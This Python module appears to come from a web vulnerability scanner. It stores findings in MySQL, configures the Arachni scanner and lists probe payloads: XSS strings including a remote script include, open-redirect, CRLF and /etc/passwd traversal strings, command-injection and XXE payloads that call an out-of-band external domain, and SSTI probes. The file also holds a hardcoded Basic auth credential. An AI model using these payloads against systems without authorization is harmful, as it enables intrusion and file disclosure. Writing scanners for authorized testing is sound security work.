#!/usr/bin/env python
# coding=utf-8

import logging
from sqlalchemy import *
from sqlalchemy.orm import scoped_session
from sqlalchemy.orm import sessionmaker
from sqlalchemy.ext.declarative import declarative_base
import sys
import pymysql
from lib.common import *


reload(sys)
sys.setdefaultencoding("utf8")


# referer:  http://www.jianshu.com/p/feb86c06c4f4
# create logger
logging.getLogger("requests").setLevel(logging.WARNING)
# logger = logging.getLogger("test")
# logger.setLevel(logging.INFO)

# # create handler
# filehandler = logging.FileHandler("logtest.log", mode="w", encoding="utf-8", delay=False)
# streamhandler = logging.StreamHandler()

# # create format
# formatter = logging.Formatter("[%(asctime)s] [%(filename)s] [%(lineno)d] %(message)s")

# # add formatter to handler
# filehandler.setFormatter(formatter)
# streamhandler.setFormatter(formatter)

# # set hander to logger
# logger.addHandler(filehandler)
# logger.addHandler(streamhandler)



def save_to_databases(data, arachni=False):

    session = MySQLUtils()
    print "======================"
    print data
    print "====================="

    insert_sql = "insert into vulns (url, method, parameters, headers_string, delta_time, vuln_name, severity, checks, proof, seed) values ('{url}', '{method}', '{parameters}', '{headers_string}', '{delta_time}', '{vuln_name}', '{severity}', '{checks}', '{proof}', '{seed}')"
    if arachni:
        #arachni result is [(),()]
        # print type(data)
        if type(data) is list:
            for d in data:
                print d
                try:
                    session.insert(insert_sql.format(url = pymysql.escape_string(d[0]),
                        method = pymysql.escape_string(d[1]),
                        parameters = pymysql.escape_string(d[2]),
                        headers_string = pymysql.escape_string(d[3]),
                        delta_time = pymysql.escape_string(d[4]),
                        vuln_name = pymysql.escape_string(d[5]),
                        severity = pymysql.escape_string(d[6]),
                        checks = pymysql.escape_string(d[7]),
                        proof = pymysql.escape_string(d[8]),
                        seed = pymysql.escape_string(d[9])))
                except Exception as e:
                    logger.error("[save_to_database] [error={}]".format(repr(e)))
                    # session.rollback()
        else:
            # logger.error(..)
            pass
    else:
        url = data["url"]
        method = data["method"]
        param = data["param"]
        vuln_name = data["type"]
        insert_sql2 = "insert into vulns(url, method, parameters, vuln_name) values('{url}', '{method}', '{parameters}', '{vuln_name}')"
        try:
            print url
            print method
            print vuln_name
            print param
            param = '' if param is None else param
            session.insert(insert_sql2.format(
                            url = pymysql.escape_string(url),
                            method = pymysql.escape_string(method),
                            parameters = pymysql.escape_string(param),
                            vuln_name = pymysql.escape_string(vuln_name)
                            )
                        )

        except Exception as e:
            logger.error("[data_to_database] [arachni=False] [reason={}]".format(repr(e)))

    session.close()



XSS_Rule = {
    "script":[
        "`';!--\"<XSS>=&{()}",
        "&\"]}alert();{//",
        "\"'><svg onload=confirm()1)>",
        "<svg onload=alert(1)>",
        "\" onfous=alert(1)\"><\"", # 事件
        "<video><source onerror=\"alert(1)\">", # H5 payload
        "</textarea>'\"});<script src=http://xss.niufuren.cc/QHDPCg?1526457930></script>"
    ],
}

USR_Rule = {
    "redirect":[
        'http://www.niufuren.cc/usr.txt', #  Valar Morghulis
        '@www.nifuren.cc/%2f..',
        '//jd.com@www.niufuren.cc/usr.txt'
    ],
}
CRLF_Rule = {
    "redirect":[
        '%0d%0acrlftest:%20crlftestvalue%0d%0a%0d%0a', #  Valar Morghulis
        '\ncrlftest: crlftestvalue\n\n',
        '\r\ncrlftest: crlftestvalue\r\n\r\n',
    ],
}

LFI_Rule = {
    "lfi":[
        "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",#    {tag="root:x:"}
        "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",#                    {tag="root:x:"}
        "/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",#    {tag="root:x:"}
        "/././././././././././././././././././././././././../../../../../../../../etc/passwd", #              {tag="root:x:"}
        "/etc/passwd", #    {tag="root:x:"}
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",#    {tag="root:x:"}
        "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",#                    {tag="root:x:"}
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",#    {tag="root:x:"}
        # "././././././././././././././././././././././././../../../../../../../../etc/passwd", #              {tag="root:x:"}
        # "/etc/passwd", #    {tag="root:x:"}
        # 还可以加入RFI
    ],
}


command_injection_payloads = [
    ";nslookup ci_{domain}.devil.yoyostay.top",
    '&nslookup ci_{domain}.devil.yoyostay.top&\'\\"`0&nslookup ci_{domain}.devil.yoyostay.top&`\'',
    "nslookup ci_{domain}.devil.yoyostay.top|nslookup ci_{domain}.devil.yoyostay.top&nslookup ci_{domain}.devil.yoyostay.top",
    ";nslookup ci_{domain}.devil.yoyostay.top|nslookup ci_{domain}.devil.yoyostay.top&nslookup ci_{domain}.devil.yoyostay.top;"
    "$(nslookup ci_{domain}.devil.yoyostay.top)",
    "';nslookup ci_{domain}.devil.yoyostay.top'",
    "'&nslookup ci_{domain}.devil.yoyostay.top'",
    "'|nslookup ci_{domain}.devil.yoyostay.top'",
    "'||nslookup ci_{domain}.devil.yoyostay.top'",
    "'$(nslookup ci_{domain}.devil.yoyostay.top)'",
    "\";nslookup ci_{domain}.devil.yoyostay.top\"",
    "\"&nslookup ci_{domain}.devil.yoyostay.top\"",
    "\"|nslookup ci_{domain}.devil.yoyostay.top\"",
    "\"||nslookup ci_{domain}.devil.yoyostay.top\"",
    "\"$(nslookup ci_{domain}.devil.yoyostay.top)\""
]


ssti_payload = ["{{159753 * 357951}}", "${{159753 * 357951}}"]

arachni_domain = "http://127.0.0.1:7331"
arachni_headers =  {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
        "Authorization" : "Basic YXJhY2huaTEyMzphcmFjaG5pMTIz",
        "Content-Type": 'application/json',
        "Connection" : "close"
    }


arachni_timeout = 30 * 60

#arachni_options = {
ARACHNI_OPTIONS = {
    "url" : "",
    "http" : {
        #"user_agent" : "Arachni/",
        "user_agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0 Security Scan",
        "request_timeout" : 3600,
        "request_redirect_limit" : 5,
        "request_concurrency" : 10,
        "request_queue_size" : 100,
        "request_headers" : {},
        "response_max_size" : 500000,
        # "cookie_string" : ""
    },
    "audit" : {
        "elements": ["links", "forms", "cookies", "headers", "jsons", "xmls", "ui_inputs", "ui_forms"]
        # "parameter_values" : True,
        # # "exclude_vector_patterns" : [],
        # # "include_vector_patterns" : [],
        # # "link_templates" : [],
        # "forms" : True,
        # "cookies" : True,
        # "headers" : True,
        # "links" : True
    },
    "input" : {
        "values" : {},
        "default_values" : {
          "(?i-mx:name)" : "what_ever_a@163.com",
          "(?i-mx:user)" : "what_ever_a@163.com",
          "(?i-mx:usr)" : "what_ever_a@163.com",
          "(?i-mx:pass)" : "whatever",
          "(?i-mx:txt)" : "arachni_text",
          "(?i-mx:num)" : "132",
          "(?i-mx:amount)" : "100",
          "(?i-mx:mail)" : "arachni@email.gr",
          "(?i-mx:account)" : "12",
          "(?i-mx:id)" : "1"
        },
        "without_defaults" : False,
        "force" : False
    },
    "browser_cluster" : {
        # "wait_for_elements" : {},
        "pool_size" : 3,
        # "job_timeout" : 25,
        # "worker_time_to_live" : 100,
        "ignore_images" : True,
        # "screen_width" : 1600,
        # "screen_height" : 1200
    },
    "scope" : {
        "redundant_path_patterns" : {},
        "dom_depth_limit" : 5,
        "exclude_path_patterns" : ["logout",],
        "exclude_content_patterns" : [],
        "include_path_patterns" : [],
        "restrict_paths" : [],
        "extend_paths" : ["logout"],
        "url_rewrites" : {},
        "page_limit" : 2
        # "directory_depth_list" : 3,
    },
    "session" : {},
    "checks" : [
        "backdoors",
        "backup_directories",
        "backup_files",
        "code_injection",
        "code_injection_php_input_wrapper",
        "code_injection_timing",
        "common_admin_interfaces",
        "cookie_set_for_parent_domain",
        "csrf",
        "cvs_svn_users",
        "directory_listing",
        "file_inclusion",
        "htaccess_limit",
        "html_objects",
        "insecure_client_access_policy",
        "insecure_cors_policy",
        "insecure_cross_domain_policy_headers",
        "ldap_injection",
        "localstart_asp",
        "mixed_resource",
        "no_sql_injection",
        "no_sql_injection_differential",
        "origin_spoof_access_restriction_bypass",
        "os_cmd_injection",
        "os_cmd_injection_timing",
        "path_traversal",
        "private_ip",
        "response_splitting",
        "rfi",
        "sql_injection",
        "sql_injection_differential",
        "sql_injection_timing",
        "ssn",
        "trainer",
        "unencrypted_password_forms",
        "unvalidated_redirect",
        "unvalidated_redirect_dom",
        "webdav",
        "xpath_injection",
        "xss",
        "xss_dom",
        "xss_dom_script_context",
        "xss_event",
        "xss_path",
        "xss_script_context",
        "xss_tag",
        "xst",
        "xxe"
    ],
      # "checks" : ["xss*", "sql*", "code*", "common*", "nosql*", "path_traversal", "Rfi*", "Xxe*", "oscmd*", "unvalidated_redirect*"],
      # "checks" : [],
    "platforms" : [],
    "plugins" : {},
    "no_fingerprinting" : False,
    "authorized_by" : None
}



XXE_payload =  '<?xml version="1.0" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY sp SYSTEM "http://xxeproxy_{domain}.devil.yoyostay.top"> ]> <r>&sp;</r>'



if __name__ == '__main__':
    data = {'url':'http://test.iqiyi.com', 'method': 'GET', 'param': 'a=b', 'type':'test'}
    Message={'url': u'https://search.jd.com/search?qrst=1&rt=1&enc=utf-8&keyword=%3Csvg+onload%3Dalert%281%29%3E&stop=1&vt=2&wq=%C3%A7%C2%8B%C2%97%C3%A4%C2%B8%C2%8D%C3%A7%C2%90%C2%86%C3%A5%C2%8C%C2%85%C3%A5%C2%AD%C2%90&bs=1&ev=exbrand_%C3%A7%C2%8B%C2%97%C3%A4%C2%B8%C2%8D%C3%A7%C2%90%C2%86%C3%AF%C2%BC%C2%88GBL%C3%AF%C2%BC%C2%89%5E1107_86494%5E&uc=0&stock=1', 'info': '[XSS]', 'type': 'XSS', 'method': u'GET', 'param': None}
    save_to_databases(Message)
